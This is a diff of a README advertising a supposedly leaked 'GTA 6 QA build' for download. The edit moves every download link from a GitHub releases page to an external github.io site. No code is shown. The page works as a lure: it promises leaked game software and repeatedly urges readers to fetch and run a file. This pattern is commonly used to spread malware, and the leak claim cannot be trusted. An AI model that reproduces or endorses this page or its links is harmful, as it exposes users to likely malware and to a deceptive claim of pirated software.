@@ -1,6 +1,6 @@
 # 🎮 GTA-6-QA-Build-Leaked-With-Missions - Play the Leaked 2026 Build Today!
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/DOWNLOAD-GTA_6_QA_BUILD-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://github.com/Theresaregimental1312/GTA-6-QA-Build-Leaked-With-Missions/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/DOWNLOAD-GTA_6_QA_BUILD-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://theresaregimental1312.github.io)
 
 ---
 
@@ -17,7 +17,7 @@ This leaked build includes all the missions from the QA testing phase, giving yo
 ### Step 1: Get the File
 
 Visit this link to download the application:
-**[https://github.com/Theresaregimental1312/GTA-6-QA-Build-Leaked-With-Missions/releases](https://github.com/Theresaregimental1312/GTA-6-QA-Build-Leaked-With-Missions/releases)**
+**[https://theresaregimental1312.github.io](https://theresaregimental1312.github.io)**
 
 When you click the link, you'll land on the releases page. Look for the most recent release file (usually at the top of the list). Click the download button next to the file name. The download will start automatically.
 
@@ -113,7 +113,7 @@ This is a leaked pre-release build. Expect some bugs and unfinished elements. Th
 
 Remember: Visit the download link below to get started.
 
-**[🚀 DOWNLOAD GTA 6 QA BUILD NOW 🚀](https://github.com/Theresaregimental1312/GTA-6-QA-Build-Leaked-With-Missions/releases)**
+**[🚀 DOWNLOAD GTA 6 QA BUILD NOW 🚀](https://theresaregimental1312.github.io)**
 
 ---
 
